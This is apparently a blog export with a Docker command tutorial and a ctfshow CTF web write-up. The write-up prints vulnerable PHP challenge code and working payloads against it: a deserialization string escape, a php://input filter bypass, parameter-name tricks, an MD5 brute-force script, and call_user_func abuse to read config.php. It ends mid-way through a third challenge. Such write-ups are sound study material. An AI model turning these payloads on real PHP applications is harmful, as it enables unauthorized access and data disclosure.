<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker基础</title>
    <url>/2020/10/15/Docker%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<script type="text/javascript" src="/z3p5/js/bai.js"></script>
<h1 id="image"><a href="#image" class="headerlink" title="image"></a>image</h1><p>镜像，容器的模版。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 拉取image文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker image pull xxx</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出本机的所有 image 文件。</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker image ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除 image 文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker image rm [imageName]</span></span><br></pre></td></tr></table></figure>
<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 运行镜像生成一个容器如果本地不存在的image，可以相当运行docker image pull自动在仓库抓取</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container run xxx</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动已经生成、已经停止运行的容器文件</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container start [containerID]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 命令行体验ubuntu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container run -it ubuntu bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出本机正在运行的容器</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 列出本机所有容器，包括终止运行的容器</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container ls --all</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看容器输出</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container logs [containerID]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入正在运行的容器的docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container <span class="built_in">exec</span> -it [containerID] /bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将容器的文件拷贝到本机</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container cp [containID]:[/path/to/file] .</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 终止容器</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container <span class="built_in">kill</span> [containID]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除容器</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container rm [containerID]</span></span><br></pre></td></tr></table></figure>
<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>dockerfile是一个文本文件用来配置image</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">8.4</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . /app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install --registry=https://registry.npm.taobao.org</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3000</span></span><br></pre></td></tr></table></figure>
<p>含义</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">8.4</span>：该 image 文件继承官方的 node image，冒号表示标签，这里标签是<span class="number">8.4</span>，即<span class="number">8.4</span>版本的 node。</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . /app：将当前目录下的所有文件（除了.dockerignore排除的路径），都拷贝进入 image 文件的/app目录。</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app：指定接下来的工作路径为/app。</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install：在/app目录下，运行npm install命令安装依赖。注意，安装后所有的依赖，都将打包进入 image 文件。</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3000</span>：将容器 <span class="number">3000</span> 端口暴露出来， 允许外部连接这个端口。</span><br><span class="line">用dockerfile创建image</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 最后的那个点表示 Dockerfile 文件所在的路径</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker image build -t koa-demo .</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -t参数用来指定 image 文件的名字，后面还可以用冒号指定标签。如果不指定，默认的标签就是latest。</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker image build -t koa-demo:0.0.1 .</span></span><br></pre></td></tr></table></figure>
<h2 id="生成容器"><a href="#生成容器" class="headerlink" title="生成容器"></a>生成容器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker container run -p 8000:3000 -it koa-demo /bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker container run -p 8000:3000 -it koa-demo:0.0.1 /bin/bash</span></span><br></pre></td></tr></table></figure>
<p>含义</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-p参数：容器的 3000 端口映射到本机的 8000 端口。</span><br><span class="line">-it参数：容器的 Shell 映射到当前的 Shell，然后你在本机窗口输入的命令，就会传入容器。</span><br><span class="line">koa-demo:0.0.1：image 文件的名字（如果有标签，还需要提供标签，默认是 latest 标签）。</span><br><span class="line">/bin/bash：容器启动以后，内部第一个执行的命令。这里是启动 Bash，保证用户可以使用 Shell。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow大吉大利杯web</title>
    <url>/2021/01/25/ctfshow%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AFweb/</url>
    <content><![CDATA[<script type="text/javascript" src="/z3p5/js/bai.js"></script>
<h2 id="spaceman-ctfshow"><a href="#spaceman-ctfshow" class="headerlink" title="spaceman(ctfshow)"></a>spaceman(ctfshow)</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="反序列化字符串逃逸"><a href="#反序列化字符串逃逸" class="headerlink" title="反序列化字符串逃逸"></a>反序列化字符串逃逸</h4><h4 id="php-input绕过"><a href="#php-input绕过" class="headerlink" title="php://input绕过"></a>php://input绕过</h4><h4 id="PHP字符串解析特性利用（空格绕过）"><a href="#PHP字符串解析特性利用（空格绕过）" class="headerlink" title="PHP字符串解析特性利用（空格绕过）"></a>PHP字符串解析特性利用（空格绕过）</h4><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spaceman</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;ctfshowvip&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;ctfshowup&#x27;</span>,<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_|\.|\]|\[/is&#x27;</span>,<span class="variable">$str</span>))&#123;            </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = filter(serialize(<span class="keyword">new</span> spaceman(<span class="variable">$user_name</span>,<span class="variable">$pass_word</span>)));</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>首先filter过滤了_.[]</p>
<p>但是需要传入的参数又必须是<code>$user_name</code>和<code>$pass_word</code>都含有下划线</p>
<p><code>extract($_POST)</code>与<code>php://input</code>与的区别</p>
<p><code>php://input</code> 无法读取<code>Content-Type</code>为<code>multipart/form-data</code>的POST数据 ，当遇到<code>Content-Type</code>为<code>multipart/form-data</code>的POST数据就默认为空值，所以$str就变成空值就可绕过过滤</p>
<p>前端修改</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://e3ffee1a-5490-4cd7-974c-96a14e83d653.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>user_name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>pass_word: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass_word&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（其实这里做麻烦了！）</p>
<p>可以利用PHP字符串解析特性，空格会被解析成下划线直接绕过！</p>
<p>即<code>user name</code>和<code>pass word</code>即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spaceman</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&quot;ctfshowvip&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> spaceman();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>); </span><br><span class="line"><span class="comment">//O:8:&quot;spaceman&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要构造的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spaceman</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;&quot;;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> spaceman();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;spaceman&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;password&quot;;s:36:&quot;&quot;;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>因为字符串变短username参数吞噬会掉原本的password，所以我们才需要如此构造，若需要正好需要保留后面的<code>&quot;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code>，我们需要将前面的<code>&quot;;s:8:&quot;password&quot;;s:36:&quot;</code>让username缺少的那些字符吞噬，我们就需要让这个几个字符包含计算至username，<code>&quot;;s:8:&quot;password&quot;;s:36:&quot;</code>一共23个字符，filter方法每一个含有ctfshowup就会减少两个字符，所以吞噬23个字符就需要12个ctfshowup，所以这里可以确定<code>$user_name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup</code></p>
<p>而12个purpletup会吞噬24个字符，所以传入的$pass_word就需要多添加一个字符，所以，序列化如下<br><code>A&quot;;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</code></p>
<p>总上payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_name=ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup</span><br><span class="line"></span><br><span class="line">A&quot;;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://ech0zr.github.io/img/post/ctfshow_daji/image-20210123140539479.png" alt="image-20210123140539479"></p>
<p>虽然一眼看去这个题就是字符串逃逸，但是其实是个非预期</p>
<p>直接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">user name=&amp;pass word=ctfshowvip</span><br></pre></td></tr></table></figure>



<h2 id="veryphp-ctfshow"><a href="#veryphp-ctfshow" class="headerlink" title="veryphp(ctfshow)"></a>veryphp(ctfshow)</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><h4 id="php-input绕过-1"><a href="#php-input绕过-1" class="headerlink" title="php://input绕过"></a>php://input绕过</h4><h4 id="PHP字符串解析特性利用（空格绕过）-1"><a href="#PHP字符串解析特性利用（空格绕过）-1" class="headerlink" title="PHP字符串解析特性利用（空格绕过）"></a>PHP字符串解析特性利用（空格绕过）</h4><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><h4 id="脚本爆破"><a href="#脚本爆破" class="headerlink" title="脚本爆破"></a>脚本爆破</h4><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h4><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qwq</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Access Denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">oao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        show_source(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\_|\.|%|\*|\~|\^|\&#x27;|\&quot;|\;|\(|\)|\]|g|e|l|i|\//is&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shaw_root</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/&#x27;</span>, <span class="variable">$shaw_root</span>)&amp;&amp; strlen(<span class="variable">$shaw_root</span>)===<span class="number">29</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Almost there.&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Input correct parameters&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ans</span>===<span class="variable">$SecretNumber</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Congratulations!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    call_user_func(<span class="variable">$my_ans</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过multipart/form-data绕过php://input的过滤</p>
<p>（也可以直接利用PHP解析字符串的特性，用空格等绕过下划线，即<code>show root</code>）</p>
<p>构造符合条件的正则获取hint</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a257ca41-91e6-4458-82c3-cb976ad3a2ae.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shaw_root:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;shaw_root&quot;</span> <span class="attr">value</span>=<span class="string">&quot;-a9&lt;b&gt;tt&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;abcphp@Rs.&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)==166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)===5</span><br></pre></td></tr></table></figure>

<p>写个py爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s,salt=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    new_s = <span class="built_in">str</span>(s) + salt</span><br><span class="line">    m = hashlib.md5(new_s.encode())</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>,<span class="number">99999</span>):</span><br><span class="line">    s = <span class="string">&#x27;shaw&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> md5(s) == <span class="string">&#x27;166b47a5cb1ca2431a0edfcef200684f&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>21475</p>
<p>构造payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a257ca41-91e6-4458-82c3-cb976ad3a2ae.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shaw_root:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;shaw_root&quot;</span> <span class="attr">value</span>=<span class="string">&quot;-a9&lt;b&gt;tt&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;abcphp@Rs.&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>ans:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ans&quot;</span> <span class="attr">value</span>=<span class="string">&quot;21475&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>my_ans:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;my_ans&quot;</span> <span class="attr">value</span>=<span class="string">&quot;phpinfo&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到的是假flag!!!</p>
<p>（call_user_func的用法）</p>
<p>尝试利用已知的类读取config.php</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://a257ca41-91e6-4458-82c3-cb976ad3a2ae.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shaw_root:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;shaw_root&quot;</span> <span class="attr">value</span>=<span class="string">&quot;-a9&lt;b&gt;tt&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;abcphp@Rs.&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>ans:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ans&quot;</span> <span class="attr">value</span>=<span class="string">&quot;21475&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>my_ans:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;my_ans[0]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;qwq&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>my_ans:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;my_ans[1]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;oao&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="虎山行-ctfshow"><a href="#虎山行-ctfshow" class="headerlink" title="虎山行(ctfshow)"></a>虎山行(ctfshow)</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h4 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h4><h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><h3 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h3><p>MiniCMS 1.9 开始找了许多REC尝试不行</p>
<p>通过对比源码找到出题人修改的地方</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = (file_get_contents(<span class="variable">$file_path</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$page_file</span>        = <span class="variable">$data</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$page_path</span>        = <span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="variable">$page_state</span>       = <span class="variable">$data</span>[<span class="string">&#x27;state&#x27;</span>];</span><br><span class="line"><span class="variable">$page_title</span>       = <span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line"><span class="variable">$page_content</span>     = <span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="variable">$page_date</span>        = <span class="variable">$data</span>[<span class="string">&#x27;date&#x27;</span>];</span><br><span class="line"><span class="variable">$page_time</span>        = <span class="variable">$data</span>[<span class="string">&#x27;time&#x27;</span>];</span><br><span class="line"><span class="variable">$page_can_comment</span> = <span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;can_comment&#x27;</span>]) ? <span class="variable">$data</span>[<span class="string">&#x27;can_comment&#x27;</span>] : <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure>

<p>原代码：</p>
